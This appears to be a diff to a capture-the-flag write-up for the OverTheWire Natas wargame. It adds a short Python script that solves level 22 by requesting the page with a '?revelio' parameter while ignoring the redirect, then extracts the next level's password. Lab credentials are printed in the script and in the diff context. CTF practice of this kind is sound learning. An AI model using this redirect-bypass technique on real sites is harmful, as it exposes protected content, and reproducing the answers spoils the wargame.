@@ -59,7 +59,18 @@ Password: CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5
 
 ### Using Python
 ```python
+import requests, re
 
+target = 'http://natas22.natas.labs.overthewire.org/'
+
+auth = ('natas22', '964laB0r7TuDqJj5b3HFtwsQoc0GhjBF')
+
+target = target + "?revelio"
+
+r = requests.get(target, auth=auth, allow_redirects=False)
+
+match = re.search(r'Password:\s(\w{32})', r.text)
+print(f"Password for next level is: {match.group(1)}")
 ```
 
 ## Vulnerability
